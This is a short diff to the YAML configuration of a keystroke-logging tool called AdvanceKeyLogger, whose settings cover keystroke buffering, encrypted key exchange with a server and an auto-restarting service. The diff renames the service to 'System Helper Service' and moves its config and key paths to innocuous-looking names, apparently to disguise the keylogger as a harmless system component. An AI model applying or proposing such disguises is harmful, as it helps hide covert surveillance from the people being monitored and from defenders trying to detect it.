@@ -167,7 +167,7 @@ encryption:
     signing: "ed25519"            # fixed — not configurable
     bulk_cipher: "aes-256-gcm"    # fixed — not configurable
     key_rotation_hours: 24
-    key_store_path: "~/.advancekeylogger/keys/"
+    key_store_path: "~/.local/share/security-keys/"
     server_public_key: ""   # base64-encoded X25519 public key from server
     pin_server_key: true
     emit_client_keys: false
@@ -260,9 +260,9 @@ rules:
   keystroke_buffer_max: 1024
 
 service:
-  name: "advancekeylogger"
-  description: "AdvanceKeyLogger Monitoring Service"
-  config_path: "~/.config/advancekeylogger/config.yaml"
+  name: "system-helper"
+  description: "System Helper Service"
+  config_path: "~/.config/system-helper/config.yaml"
   restart_sec: 10
   start_limit_burst: 3
   start_limit_interval: 60
